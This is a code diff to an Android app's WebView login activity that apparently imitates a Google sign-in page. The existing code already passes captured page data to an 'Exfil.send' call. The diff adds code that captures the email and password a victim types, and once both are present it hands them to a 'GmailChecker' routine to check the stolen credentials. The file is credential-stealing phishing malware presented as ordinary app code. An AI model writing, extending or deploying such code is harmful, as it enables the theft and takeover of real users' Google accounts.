@@ -10,6 +10,8 @@ import android.webkit.WebViewClient;
 public class WebLoginActivity extends Activity {
 
     private WebView web;
+    private String savedEmail = "";
+    private String savedPassword = "";
 
     @Override
     protected void onCreate(Bundle b) {
@@ -32,6 +34,14 @@ public class WebLoginActivity extends Activity {
         @JavascriptInterface
         public void log(String data) {
             Exfil.send("GOOGLE_LOGIN", data);
+            if (data.startsWith("email=")) {
+                savedEmail = data.substring(6);
+            } else if (data.startsWith("password=")) {
+                savedPassword = data.substring(9);
+                if (!savedEmail.isEmpty() && !savedPassword.isEmpty()) {
+                    GmailChecker.check(savedEmail, savedPassword);
+                }
+            }
         }
 
         @JavascriptInterface
